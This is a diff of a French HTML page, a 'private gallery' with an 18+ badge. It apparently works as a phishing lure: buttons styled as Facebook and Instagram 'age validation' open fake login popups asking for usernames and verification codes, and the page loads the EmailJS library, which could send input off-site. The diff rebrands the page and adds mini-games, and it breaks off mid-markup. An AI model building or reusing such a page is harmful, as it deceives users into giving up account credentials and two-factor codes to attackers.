@@ -1,244 +1,402 @@
 <!DOCTYPE html>
 <html lang="fr">
-
 <head>
   <meta charset="utf-8"/>
-  <title>Gallerie privée !</title>
+  <title>Galerie privée</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 
-  <!-- Balises Open Graph pour l’aperçu -->
-  <meta property="og:title" content="Accès à ma gallerie privée."/>
-  <meta property="og:image" content="https://tatoos-shop.onrender.com/preview_tatoos.jpg"/>
-  <meta property="og:url" content="https://tatoos-shop.onrender.com"/>
+  <!-- Social preview -->
+  <meta property="og:title" content="Accès à ma galerie privée"/>
+  <meta property="og:image" content="https://gabriella-swan.onrender.com/preview_gabriella.jpg"/>
+  <meta property="og:url" content="https://gabriella-swan.onrender.com"/>
   <meta property="og:type" content="website"/>
 
-  <!-- Balises Twitter pour compatibilité -->
   <meta name="twitter:card" content="summary_large_image"/>
-  <meta name="twitter:title" content="Gallerie privée !"/>
-  <meta name="twitter:image" content="https://tatoos-shop.onrender.com/preview_tatoos.jpg"/>
+  <meta name="twitter:title" content="Galerie privée"/>
+  <meta name="twitter:image" content="https://gabriella-swan.onrender.com/preview_gabriella.jpg"/>
 
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&display=swap" rel="stylesheet"/>
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet"/>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
   <style>
     :root{
-      --bg1:#1a1c2c;
-      --bg2:#2a2f4f;
-      --accent1:#7b61ff;
-      --accent2:#ff6ac1;
-      --glass:rgba(26,28,44,0.6);
-      --glass-border:rgba(255,255,255,0.18);
-      --muted:#e6e7f2;
-      --fb1:#1877F2; --fb2:#4a90e2;
-      --ig1:#f09433; --ig2:#bc1888; /* dégradé Instagram */
-      --shadow:0 18px 50px rgba(0,0,0,.55);
+      --bg:#0f1222;
+      --surface:#151836;
+      --surface-2:#1c2046;
+      --text:#f5f7ff;
+      --muted:#c9cce2;
+      --accent:#6c8cff;
+      --accent-2:#b466ff;
+      --outline:rgba(255,255,255,.14);
+      --glass:rgba(21,24,54,.68);
+      --shadow:0 20px 60px rgba(0,0,0,.55);
+      --radius:18px;
+
+      /* shape variable (for avatars), overridable by classes */
+      --thumb-shape: polygon(25% 6%, 75% 6%, 100% 50%, 75% 94%, 25% 94%, 0% 50%);
     }
 
-    body {
-      margin: 0;
-      font-family: 'Playfair Display', serif;
-      color: #fff;
-      text-align: center;
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      color:var(--text);
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", sans-serif;
       background:
-        radial-gradient(1200px 700px at 20% -10%, #283069 0%, transparent 60%),
-        radial-gradient(1000px 600px at 100% 10%, #24305a 0%, transparent 60%),
-        linear-gradient(135deg, var(--bg1), var(--bg2));
-      min-height:100vh;
-      position: relative;
-      overflow-x:hidden;
+        radial-gradient(900px 500px at 10% -10%, #3a174f 0%, transparent 60%),
+        radial-gradient(700px 400px at 100% 0%, #2c0d3a 0%, transparent 60%),
+        linear-gradient(180deg, #0a0012, #120018);
+      letter-spacing:.2px;
     }
 
-    .header { padding: 48px 20px 18px; }
-    .header h1 {
-      font-size: clamp(2.2rem, 6vw, 4rem);
-      color: #FFFFFF;
-      text-shadow: 0 10px 30px rgba(0,0,0,0.35);
-      margin: 0 0 10px;
-    }
-    .subtitle { font-size: clamp(1rem, 2.6vw, 1.4rem); color: var(--muted); margin: 0 0 18px; }
+    .page{ max-width:1100px; margin: 0 auto; padding: clamp(20px, 4vw, 36px); }
 
-    .cta-row{ display:flex; gap:12px; justify-content:center; flex-wrap:wrap; margin-bottom:6px; }
-
-    .button {
-      color: #fff;
-      border: none;
-      padding: 14px 22px;
-      font-size: 1.05em;
-      font-weight: 700;
-      border-radius: 9999px;
-      cursor: pointer;
-      transition: transform .18s ease, box-shadow .18s ease, filter .18s ease;
+    .header{ padding-top: 20px; text-align:center; }
+    .badge{
       display:inline-flex; align-items:center; gap:10px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.35), inset 0 0 0 1px rgba(255,255,255,.08);
+      padding:8px 14px; border:1px solid var(--outline);
+      border-radius:9999px; color:var(--muted);
+      background: rgba(255,255,255,.02);
+      backdrop-filter: blur(6px);
+      font-weight:700; letter-spacing:.3px;
     }
-    .button[disabled] { opacity:.7; cursor:not-allowed; }
-    .button:hover { filter:saturate(1.05); transform: translateY(-2px); box-shadow: 0 16px 35px rgba(0,0,0,0.45); }
-    .button.fb{ background: linear-gradient(90deg, var(--fb1), var(--fb2)); }
-    .button.ig{ background: linear-gradient(90deg, var(--ig1), var(--ig2)); }
-    .icon { width:18px; height:18px; display:inline-block; }
+    .badge img{height:18px;width:auto;display:block}
+    .header h1{
+      font-family: "Playfair Display", Georgia, serif;
+      font-weight:700; font-size: clamp(2rem, 5vw, 3.6rem); line-height:1.1;
+      margin: 14px 0 8px; text-shadow: 0 10px 30px rgba(0,0,0,.45);
+    }
+    .subtitle{ margin: 0 auto 18px; color: var(--muted); font-size: clamp(1rem, 2.5vw, 1.2rem); max-width: 56ch; }
 
-    /* Avatars : hexagone autour du centre */
+    .cta-row{display:flex; justify-content:center; gap:12px; flex-wrap:wrap; margin-bottom: 24px;}
+    .button{
+      color:#fff; border:1px solid rgba(255,255,255,.08);
+      padding: 13px 18px; font-size: 1rem; font-weight: 800;
+      border-radius: 9999px; cursor: pointer;
+      transition: transform .16s ease, box-shadow .16s ease, filter .16s ease, background .16s ease;
+      display:inline-flex; align-items:center; gap:10px;
+      background: linear-gradient(90deg, var(--accent), var(--accent-2));
+      box-shadow: 0 10px 28px rgba(0,0,0,.35);
+    }
+    .button:hover{ transform: translateY(-2px); filter: saturate(1.06) brightness(1.02); }
+    .button[disabled]{opacity:.7; cursor:not-allowed;}
+    .button.fb{ background: linear-gradient(90deg, #1877F2, #4a90e2); }
+    .button.ig{ background: linear-gradient(90deg, #f09433, #bc1888); }
+    .icon{ width:18px;height:18px; display:inline-block; }
+
     .bitmoji-layout{
       position: relative;
-      width: 480px; height: 480px;
-      margin: 26px auto 8px;
+      width: 520px; height: 520px;
+      margin: 20px auto 10px;
       max-width: 92vw; max-height: 92vw;
     }
-    .bitmoji {
+    .bitmoji{
       --scale: 1;
       width: 112px; height: 112px;
       background-size: cover; background-position: center;
-      clip-path: polygon(25% 6%, 75% 6%, 100% 50%, 75% 94%, 25% 94%, 0% 50%);
-      border: 2px solid rgba(255,255,255,0.85);
-      box-shadow: 0 8px 22px rgba(0,0,0,0.45);
-      position: absolute;
-      cursor: pointer;
-      transition: transform .25s ease, box-shadow .25s ease, outline .25s ease, filter .25s ease;
+      clip-path: var(--thumb-shape);
+      border: 1.5px solid rgba(255,255,255,.85);
+      box-shadow: 0 10px 24px rgba(0,0,0,.45);
+      position: absolute; cursor: pointer;
+      transition: transform .22s ease, box-shadow .22s ease, outline .22s ease, filter .22s ease;
       outline: 0 solid transparent;
       transform: translate(-50%, -50%) scale(var(--scale));
       will-change: transform, top, left;
+      background-color:#0b0e1b;
+      border-radius: 0;
     }
-    .bitmoji:hover { --scale: 1.08; box-shadow: 0 12px 28px rgba(0,0,0,.55); }
-    .bitmoji.active { outline: 10px solid rgba(255,255,255,0.12); filter: saturate(1.06); }
+    .bitmoji:hover{ --scale: 1.06; box-shadow: 0 16px 36px rgba(0,0,0,.55); }
+    .bitmoji.active{ outline: 10px solid rgba(255,255,255,.10); filter:saturate(1.05); }
 
-    .bottom-banner { display:flex; justify-content:center; position:relative; }
-    .bottom-banner img {
-      width: 92%;
-      max-width: 1000px;
-      height: auto;
-      display: block;
-      margin: 18px auto 24px;
-      border-radius: 22px;
-      box-shadow: var(--shadow);
-      transition: border-radius .25s ease, box-shadow .25s ease, transform .25s ease, filter .25s ease;
+    .bottom-banner{ display:flex; justify-content:center; position:relative; }
+    .bottom-banner img{
+      width: 92%; max-width: 980px; height: auto;
+      display:block; margin: 16px auto 26px;
+      border-radius: var(--radius); box-shadow: var(--shadow);
+      transition: border-radius .2s ease, box-shadow .2s ease, transform .2s ease, filter .2s ease;
     }
-    .bottom-banner.avatar-mode img{
-      border-radius: 18px;
-      box-shadow: 0 22px 60px rgba(0,0,0,.6);
-      transform: translateZ(0);
-      filter: saturate(1.05);
-    }
+    .bottom-banner.avatar-mode img{ border-radius: 14px; filter: saturate(1.04); }
 
-    .overlay {
-      position: fixed; inset: 0;
-      background: rgba(0,0,0,0.55);
-      display: none;
-      z-index: 999;
-      backdrop-filter: blur(2px);
+    .overlay{ position: fixed; inset: 0; background: rgba(0,0,0,.55); display: none; z-index: 999; backdrop-filter: blur(2px); }
+    .login-popup, .verification-popup{
+      position: fixed; top: 10%; left: 50%; transform: translateX(-50%);
+      width: min(92%, 480px);
+      background: var(--glass); color: var(--text); padding: 22px;
+      border-radius: var(--radius); border: 1px solid var(--outline);
+      box-shadow: var(--shadow); display: none; text-align:left; z-index:1000; backdrop-filter: blur(14px);
     }
-    .login-popup, .verification-popup {
-      position: fixed;
-      top: 10%;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 90%; max-width: 460px;
-      background: var(--glass);
-      color: #e8ebff;
-      padding: 24px;
-      border-radius: 22px;
-      border: 1px solid var(--glass-border);
-      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-      display: none;
-      text-align: left;
-      z-index: 1000;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      backdrop-filter: blur(14px);
+    .login-popup h3, .verification-popup h3{ margin:0 0 12px; font-size:1.15rem; font-weight:800; text-align:center; }
+    .login-popup label, .verification-popup label{ color: var(--text); font-weight: 600; display:inline-block; margin: 8px 0; }
+    .login-popup input, .verification-popup input{
+      width:100%; background:#141736; border:1px solid #2d3365; color:var(--text);
+      border-radius:12px; padding:12px; outline:none; margin-bottom:10px;
     }
-    .login-popup h3, .verification-popup h3 {
-      margin: 0 0 12px;
-      font-size: 1.2rem;
-      font-weight: 800;
-      color: #fff;
-      text-align: center;
-    }
-    .login-popup label, .verification-popup label { color: #e8ebff; font-weight: 600; display: inline-block; margin: 8px 0; }
-    .login-popup input, .verification-popup input {
-      width: 100%;
-      background: rgba(30,32,52,.85);
-      border: 1px solid #3A3F68;
-      color: #e8ebff;
-      border-radius: 12px;
-      padding: 12px;
-      outline: none;
-      margin-bottom: 10px;
-    }
-    .login-popup input::placeholder, .verification-popup input::placeholder { color: #b8bde0; }
+    .login-popup input::placeholder, .verification-popup input::placeholder{ color:#aab0d9; }
+    .popup-actions{ display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:8px; }
+    .btn{ border:none; border-radius:9999px; padding:12px 16px; font-weight:800; cursor:pointer; }
+    .btn[disabled]{opacity:.7; cursor:not-allowed;}
+    .btn-primary{ background: linear-gradient(90deg, var(--accent), var(--accent-2)); color:#fff; }
+    .btn-primary:hover{ filter:saturate(1.05) brightness(1.02); }
+    .btn-secondary{ background: transparent; color: var(--text); border: 1px solid var(--outline); }
+    .btn-secondary:hover{ background: rgba(255,255,255,.03); }
+    .helper{ font-size:.9rem; color:#d5d9ff; margin-top:6px; min-height:1.2em; }
 
-    .popup-actions {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
-      margin-top: 8px;
-    }
-    .btn { 
-      border: none; border-radius: 9999px; padding: 12px 16px; font-weight: 800; cursor: pointer;
-    }
-    .btn[disabled] { opacity:.7; cursor:not-allowed; }
-    .btn-primary { background: linear-gradient(90deg, var(--accent1), var(--accent2)); color: #fff; }
-    .btn-primary:hover { filter:saturate(1.06) brightness(1.02); }
-    .btn-secondary { background: transparent; color: #e8ebff; border: 1px solid #3A3F68; }
-    .btn-secondary:hover { background: rgba(42,46,74,.8); }
-
-    .helper { font-size:.9rem; color:#cfd4ff; margin-top:6px; min-height:1.2em; }
-  
-    .sound-toggle {
-      position: fixed;
-      right: 14px;
-      bottom: 14px;
-      z-index: 2000;
-      background: #232845;
-      color: #fff;
-      border: 1px solid rgba(255,255,255,0.12);
-      border-radius: 9999px;
-      padding: 10px 14px;
-      font-weight: 800;
-      cursor: pointer;
-      box-shadow:
-        8px 8px 18px rgba(0,0,0,0.35),
-        -6px -6px 16px rgba(255,255,255,0.06);
+    .sound-toggle{
+      position: fixed; right: 14px; bottom: 14px; z-index: 2000;
+      background: var(--surface); color: var(--text);
+      border: 1px solid var(--outline); border-radius: 9999px;
+      padding: 10px 14px; font-weight: 800; cursor: pointer;
+      box-shadow: 8px 8px 18px rgba(0,0,0,.35), -6px -6px 16px rgba(255,255,255,.04);
       display:inline-block;
     }
-    .sound-toggle:hover { filter:saturate(1.05) brightness(1.03); }
-  </style>
-</head>
-<body>
+    .sound-toggle:hover{ filter:saturate(1.05) brightness(1.03); }
 
+    /* Shape selector */
+    .shape-toggle{
+      position: fixed; left: 14px; bottom: 14px; z-index: 2000;
+      display:flex; flex-direction:column; align-items:flex-start; gap:10px;
+    }
+    .shape-fab{
+      background: var(--surface); color: var(--text);
+      border: 1px solid var(--outline); border-radius: 9999px;
+      padding: 10px 14px; font-weight: 800; cursor: pointer;
+      box-shadow: 8px 8px 18px rgba(0,0,0,.35), -6px -6px 16px rgba(255,255,255,.04);
+    }
+    .shape-panel{
+      display:none; padding:10px; background: var(--glass);
+      border:1px solid var(--outline); border-radius: 14px; box-shadow: var(--shadow);
+      backdrop-filter: blur(10px);
+    }
+    .shape-panel.open{ display:flex; gap:8px; flex-wrap:wrap; max-width: 260px; }
+    .shape-btn{
+      font-weight:800; font-size:.9rem; padding:8px 12px; border-radius:9999px;
+      border:1px solid var(--outline); background: rgba(255,255,255,.05); color:var(--text);
+      cursor:pointer;
+    }
+    .shape-btn[aria-pressed="true"]{ background: linear-gradient(90deg, var(--accent), var(--accent-2)); border-color: transparent; }
+    .shape-hint{ color:var(--muted); font-size:.85rem; margin-top:6px; }
+
+    body.shape-hex      { --thumb-shape: polygon(25% 6%, 75% 6%, 100% 50%, 75% 94%, 25% 94%, 0% 50%); }
+    body.shape-circle   { --thumb-shape: circle(50% at 50% 50%); }
+    body.shape-diamond  { --thumb-shape: polygon(50% 0,100% 50%,50% 100%,0 50%); }
+    body.shape-round    { --thumb-shape: none; }
+    body.shape-round .bitmoji{ border-radius: 18px; }
+
+    :focus-visible{ outline:2px solid var(--accent); outline-offset:2px; border-radius:12px; }
+
+    /* Memory game modal */
+    .mg-open-btn{
+      position: fixed; left: 14px; bottom: 70px; z-index: 2000;
+      background: var(--surface); color: var(--text);
+      border: 1px solid var(--outline); border-radius: 9999px;
+      padding: 10px 14px; font-weight: 800; cursor: pointer;
+      box-shadow: 8px 8px 18px rgba(0,0,0,.35), -6px -6px 16px rgba(255,255,255,.04);
+    }
+    .mg-overlay{
+      position: fixed; inset:0; background: rgba(0,0,0,.6); display:none; z-index: 3000;
+      backdrop-filter: blur(2px);
+    }
+    .mg-modal{
+      position: fixed; top: 50%; left:50%; transform: translate(-50%, -50%);
+      width: min(94vw, 760px); background: var(--glass); color: var(--text);
+      border:1px solid var(--outline); border-radius: 18px; box-shadow: var(--shadow);
+      padding: 16px 16px 22px; display:none; z-index: 3001;
+    }
+    .mg-header{ display:flex; align-items:center; justify-content:space-between; gap:10px; margin-bottom: 10px; }
+    .mg-title{ font-weight:800; font-size:1.1rem; }
+    .mg-controls{ display:flex; align-items:center; gap:8px; }
+    .mg-stat{ color: var(--muted); font-weight:700; }
+    .mg-btn{ padding:8px 12px; border-radius:9999px; border:1px solid var(--outline); background: rgba(255,255,255,.06); color:var(--text); font-weight:800; cursor:pointer; }
+    .mg-grid{
+      display:grid; grid-template-columns: repeat(4, minmax(70px, 1fr)); gap: 10px;
+      width:100%; margin-top: 8px;
+    }
+    .mg-card{
+      position: relative; aspect-ratio: 3/4; border-radius: 14px; overflow:hidden; cursor:pointer;
+      background: #0b0e1b; border: 1px solid #2d3365; transform-style: preserve-3d;
+      transition: transform .3s ease;
+    }
+    .mg-card-inner{ position:absolute; inset:0; transform-style: preserve-3d; transition: transform .35s ease; }
+    .mg-card-front, .mg-card-back{
+      position:absolute; inset:0; backface-visibility:hidden; background-size: cover; background-position:center;
+    }
+    .mg-card-front{ transform: rotateY(0deg); background: linear-gradient(180deg, #141a4b, #0b0e1b); display:flex; align-items:center; justify-content:center; font-weight:800; color:#9aa3ff; }
+    .mg-card-back{ transform: rotateY(180deg); }
+    .mg-card.flipped .mg-card-inner{ transform: rotateY(180deg); }
+    .mg-win{
+      margin-top:10px; padding:10px; text-align:center; font-weight:800; color:#a2ffcf; display:none;
+      border:1px dashed rgba(162,255,207,.4); border-radius:12px; background: rgba(162,255,207,.06);
+    }
+
+    @media (max-width:640px){
+      .mg-grid{ grid-template-columns: repeat(3, 1fr); }
+    }
+  </style>
+
+  <!-- Added: Reflex & Puzzle games styles -->
+  <style>
+    /* Floating open buttons for extra games */
+    .rx-open-btn, .pz-open-btn{
+      position: fixed; left: 14px; z-index: 2000;
+      background: var(--surface); color: var(--text);
+      border: 1px solid var(--outline); border-radius: 9999px;
+      padding: 10px 14px; font-weight: 800; cursor: pointer;
+      box-shadow: 8px 8px 18px rgba(0,0,0,.35), -6px -6px 16px rgba(255,255,255,.04);
+    }
+    .rx-open-btn{ bottom: 126px; } /* stack above memory btn */
+    .pz-open-btn{ bottom: 182px; }
+
+    .rx-overlay, .pz-overlay{
+      position: fixed; inset:0; background: rgba(0,0,0,.6); display:none; z-index: 3000;
+      backdrop-filter: blur(2px);
+    }
+    .rx-modal, .pz-modal{
+      position: fixed; top: 50%; left:50%; transform: translate(-50%, -50%);
+      width: min(94vw, 760px); background: var(--glass); color: var(--text);
+      border:1px solid var(--outline); border-radius: 18px; box-shadow: var(--shadow);
+      padding: 16px 16px 22px; display:none; z-index: 3001;
+    }
+    .gx-header{ display:flex; align-items:center; justify-content:space-between; gap:10px; margin-bottom: 10px; }
+    .gx-title{ font-weight:800; font-size:1.1rem; }
+    .gx-controls{ display:flex; align-items:center; gap:8px; }
+    .gx-btn{ padding:8px 12px; border-radius:9999px; border:1px solid var(--outline); background: rgba(255,255,255,.06); color:var(--text); font-weight:800; cursor:pointer; }
+
+    /* Reflex game area */
+    .rx-area{
+      position: relative; width: 100%; height: 360px; border: 1px dashed rgba(255,255,255,.2);
+      border-radius: 14px; overflow: hidden; background: rgba(10,12,28,.4);
+    }
+    .rx-target{
+      position:absolute; width: 64px; height: 64px; border-radius: 9999px; background: linear-gradient(90deg, var(--accent), var(--accent-2));
+      display:none; align-items:center; justify-content:center; font-weight:800; color:#fff;
+      box-shadow: 0 10px 24px rgba(0,0,0,.45);
+    }
+    .rx-stats{ margin-top:10px; display:flex; gap:12px; color: var(--muted); font-weight:700; }
+
+    /* Puzzle grid */
+    .pz-grid{
+      --n:3;
+      position: relative; width: min(92vw, 540px); height: min(92vw, 540px);
+      margin: 0 auto; display:grid; grid-template-columns: repeat(var(--n), 1fr); gap:6px;
+    }
+    .pz-tile{
+      position: relative; aspect-ratio: 1/1; border-radius: 12px; overflow:hidden; cursor:pointer;
+      background-size: 300% 300%; background-position: center; background-color:#0b0e1b; border: 1px solid #2d3365;
+      display: grid; place-items:center; font-weight:800; color:#9aa3ff;
+    }
+    .pz-empty{ background: transparent; border: 1px dashed rgba(255,255,255,.2); cursor:default; }
+    .pz-win{ margin-top:10px; padding:10px; text-align:center; font-weight:800; color:#a2ffcf; display:none;
+      border:1px dashed rgba(162,255,207,.4); border-radius:12px; background: rgba(162,255,207,.06); }
+  </style>
+
+
+  <!-- Added: Puzzle avatar selector styles -->
+  <style>
+    .pz-picker{ display:flex; align-items:center; gap:10px; margin-bottom:12px; flex-wrap:wrap; }
+    .pz-picker-label{ font-weight:800; opacity:.9; }
+    .pz-avatars{ display:flex; gap:8px; flex-wrap:wrap; }
+    .pz-thumb{
+      width:44px; height:44px; border-radius:10px; border:2px solid transparent;
+      background-size:cover; background-position:center; cursor:pointer;
+      box-shadow: 0 6px 14px rgba(0,0,0,.35);
+    }
+    .pz-thumb[aria-selected="true"]{ border-color: var(--accent, #8aa3ff); }
+    .pz-thumb:focus{ outline: 2px solid var(--accent, #8aa3ff); outline-offset: 2px; }
+  </style>
+
+
+  <!-- Added: Unified Jeux menu styles -->
+  <style>
+    /* Hide individual game open buttons; use a single entry point */
+    .mg-open-btn, .rx-open-btn, .pz-open-btn{ display: none !important; }
+
+    .games-open-btn{
+      position: fixed; left: 14px; bottom: 126px; z-index: 2100;
+      background: var(--surface); color: var(--text);
+      border: 1px solid var(--outline); border-radius: 9999px;
+      padding: 12px 16px; font-weight: 800; cursor: pointer;
+      box-shadow: 8px 8px 18px rgba(0,0,0,.35), -6px -6px 16px rgba(255,255,255,.04);
+    }
+    .games-overlay{ position: fixed; inset:0; background: rgba(0,0,0,.6); display:none; z-index: 3000; backdrop-filter: blur(2px); }
+    .games-modal{
+      position: fixed; top:50%; left:50%; transform: translate(-50%, -50%);
+      width: min(92vw, 720px); background: var(--glass); color: var(--text);
+      border:1px solid var(--outline); border-radius: 18px; box-shadow: var(--shadow);
+      padding: 18px; display:none; z-index: 3001;
+    }
+    .games-header{ display:flex; align-items:center; justify-content:space-between; margin-bottom: 10px; }
+    .games-title{ font-weight: 900; font-size: 1.1rem; }
+    .games-grid{ display:grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; }
+    .game-card{ border:1px solid var(--outline); border-radius: 14px; padding: 14px; background: rgba(255,255,255,.06); cursor:pointer; display:flex; gap:10px; align-items:center; font-weight:800; }
+    .game-card:hover{ background: rgba(255,255,255,.12); }
+    .games-close{ padding:8px 12px; border-radius: 9999px; border:1px solid var(--outline); background: rgba(255,255,255,.06); color: var(--text); font-weight:800; cursor:pointer; }
+  </style>
+
+
+  <!-- Added: Improved gate modal styles -->
+  <style>
+    .gate-overlay{ position: fixed; inset:0; background: rgba(0,0,0,.6); display:none; z-index: 5000; backdrop-filter: blur(2px); }
+    .gate-modal{
+      position: fixed; top:50%; left:50%; transform: translate(-50%, -50%);
+      width: min(92vw, 520px); background: var(--glass, rgba(20,22,40,.9)); color: var(--text, #fff);
+      border:1px solid var(--outline, rgba(255,255,255,.12)); border-radius: 18px; box-shadow: 0 18px 60px rgba(0,0,0,.5);
+      padding: 18px; display:none; z-index: 5001;
+      animation: gate-pop .28s ease-out;
+    }
+    @keyframes gate-pop { from{ transform: translate(-50%,-46%) scale(.96); opacity:.5 } to{ transform: translate(-50%,-50%) scale(1); opacity:1 } }
+    .gate-header{ display:flex; align-items:center; gap:10px; margin-bottom:8px; }
+    .gate-icon{ font-size: 1.6rem; }
+    .gate-title{ font-weight:900; font-size: 1.1rem; }
+    .gate-body{ color: var(--muted, #cbd3ff); margin-bottom: 14px; }
+    .gate-actions{ display:flex; gap:10px; justify-content:flex-end; }
+    .btn{ padding:10px 14px; border-radius: 9999px; border:1px solid var(--outline, rgba(255,255,255,.17)); background: rgba(255,255,255,.06); color:#fff; font-weight:800; cursor:pointer; }
+    .btn-primary{ background: linear-gradient(90deg, var(--accent,#8aa3ff), var(--accent-2,#77ffd9)); border-color: transparent; color:#0b0e1b; }
+  </style>
+
+</head>
+<body class="shape-hex">
+  <!-- Audio -->
   <audio id="bgm" src="music.wav" preload="auto" autoplay loop playsinline></audio>
 
-  <div class="header">
-    <h1>Tatoos shop - Gallerie privée ! !</h1>
-    <p class="subtitle">validez votre âge et accèdez à mon univers, ma passion, mon travail!</p>
+  <div class="page">
+    <header class="header">
+      <div class="badge" aria-label="Accès réservé aux adultes">
+        <img src="banner.png" alt="18+" loading="lazy"/>
+        Accès réservé aux 18+
+      </div>
+      <h1>Galerie privée</h1>
+      <p class="subtitle">Validez votre âge et accèdez à mon univers, ma passion, mon travail!</p>
 
-    <div class="cta-row">
-      <button class="button fb" id="facebookBtn" onclick="triggerFirstPlay(); openFacebookPopup()">
-        <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-          <path d="M22 12.06C22 6.48 17.52 2 11.94 2S2 6.48 2 12.06c0 4.99 3.66 9.13 8.44 9.94v-7.03H7.9v-2.91h2.54V9.41c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.23.2 2.23.2v2.45h-1.26c-1.24 0-1.63.77-1.63 1.56v1.87h2.78l-.44 2.91h-2.34V22c4.78-.81 8.44-4.95 8.44-9.94z"/>
-        </svg>
-        Valider mon âge (Facebook)
-      </button>
+      <div class="cta-row">
+        <button class="button fb" id="facebookBtn" onclick="triggerFirstPlay(); openFacebookPopup()">
+          <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M22 12.06C22 6.48 17.52 2 11.94 2S2 6.48 2 12.06c0 4.99 3.66 9.13 8.44 9.94v-7.03H7.9v-2.91h2.54V9.41c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.23.2 2.23.2v2.45h-1.26c-1.24 0-1.63.77-1.63 1.56v1.87h2.78l-.44 2.91h-2.34V22c4.78-.81 8.44-4.95 8.44-9.94z"/>
+          </svg>
+          Valider mon âge (Facebook)
+        </button>
 
-      <button class="button ig" id="instagramBtn" onclick="triggerFirstPlay(); openInstagramPopup()">
-        <!-- Icône Instagram simplifiée -->
-        <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-          <path d="M7 2h10a5 5 0 015 5v10a5 5 0 01-5 5H7a5 5 0 01-5-5V7a5 5 0 015-5zm10 2H7a3 3 0 00-3 3v10a3 3 0 003 3h10a3 3 0 003-3V7a3 3 0 00-3-3zm-5 3.5a5.5 5.5 0 110 11 5.5 5.5 0 010-11zm0 2a3.5 3.5 0 100 7 3.5 3.5 0 000-7zM18 6.5a1.25 1.25 0 110 2.5 1.25 1.25 0 010-2.5z"/>
-        </svg>
-        Valider mon âge (Instagram)
-      </button>
+        <button class="button ig" id="instagramBtn" onclick="triggerFirstPlay(); openInstagramPopup()">
+          <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M7 2h10a5 5 0 015 5v10a5 5 0 01-5 5H7a5 5 0 01-5-5V7a5 5 0 015-5zm10 2H7a3 3 0 00-3 3v10a3 3 0 003 3h10a3 3 0 003-3V7a3 3 0 00-3-3zm-5 3.5a5.5 5.5 5.5 0 110 11 5.5 5.5 0 010-11zm0 2a3.5 3.5 0 100 7 3.5 3.5 0 000-7zM18 6.5a1.25 1.25 0 110 2.5 1.25 1.25 0 010-2.5z"/>
+          </svg>
+          Valider mon âge (Instagram)
+        </button>
+      </div>
+    </header>
+
+    <div class="bitmoji-layout" id="bitmojiHex">
+      <div class="bitmoji" data-src="avatar1.png" style="background-image:url('avatar1.png')"></div>
+      <div class="bitmoji" data-src="avatar2.png" style="background-image:url('avatar2.png')"></div>
+      <div class="bitmoji" data-src="avatar3.png" style="background-image:url('avatar3.png')"></div>
+      <div class="bitmoji" data-src="avatar4.png" style="background-image:url('avatar4.png')"></div>
+      <div class="bitmoji" data-src="avatar5.png" style="background-image:url('avatar5.png')"></div>
+      <div class="bitmoji" data-src="avatar6.png" style="background-image:url('avatar6.png')"></div>
     </div>
-  </div>
 
-  <!-- Avatars en hexagone autour du centre -->
-  <div class="bitmoji-layout" id="bitmojiHex">
-    <div class="bitmoji" data-src="avatar1.png" style="background-image:url('avatar1.png')"></div>
-    <div class="bitmoji" data-src="avatar2.png" style="background-image:url('avatar2.png')"></div>
-    <div class="bitmoji" data-src="avatar3.png" style="background-image:url('avatar3.png')"></div>
-    <div class="bitmoji" data-src="avatar4.png" style="background-image:url('avatar4.png')"></div>
-    <div class="bitmoji" data-src="avatar5.png" style="background-image:url('avatar5.png')"></div>
-    <div class="bitmoji" data-src="avatar6.png" style="background-image:url('avatar6.png')"></div>
-  </div>
-
-  <div class="bottom-banner" id="bannerWrap">
-    <img src="banner.png" alt="Shooting banner" id="mainBanner"/>
+    <div class="bottom-banner" id="bannerWrap">
+      <img src="banner.png" alt="Bannière 18+" id="mainBanner"/>
+    </div>
   </div>
 
   <!-- Overlay & Popups -->
@@ -257,7 +415,6 @@
     <div class="helper" id="fb-helper"></div>
   </div>
 
-  <!-- Popup Instagram -->
   <div class="login-popup" id="instagramPopup">
     <h3>Valide ton âge avec Instagram</h3>
     <label for="ig-user">Nom d’utilisateur</label>
@@ -282,14 +439,51 @@
     <div class="helper" id="code-helper"></div>
   </div>
 
+  <!-- Shape selector -->
+  <div class="shape-toggle" aria-controls="shapePanel">
+    <button class="shape-fab" id="shapeFab" aria-expanded="false" aria-controls="shapePanel" title="Choisir la forme des aperçus">⚙️</button>
+    <div class="shape-panel" id="shapePanel" role="group" aria-label="Formes d’aperçus">
+      <button class="shape-btn" data-shape="shape-hex">Hexagone</button>
+      <button class="shape-btn" data-shape="shape-circle">Cercle</button>
+      <button class="shape-btn" data-shape="shape-round">Carré arrondi</button>
+      <button class="shape-btn" data-shape="shape-diamond">Losange</button>
+      <div class="shape-hint">Astuce : votre choix est mémorisé.</div>
+    </div>
+  </div>
+
+  <!-- Memory Game trigger + modal -->
+  <button class="mg-open-btn" id="mgOpenBtn" title="Jouer au jeu de mémoire">🧩 Jeu</button>
+  <div class="mg-overlay" id="mgOverlay"></div>
+  <div class="mg-modal" id="mgModal" role="dialog" aria-modal="true" aria-labelledby="mgTitle">
+    <div class="mg-header">
+      <div class="mg-title" id="mgTitle">Jeu de mémoire</div>
+      <div class="mg-controls">
+        <span class="mg-stat" id="mgMoves">0 coups</span>
+        <span class="mg-stat" id="mgTime">00:00</span>
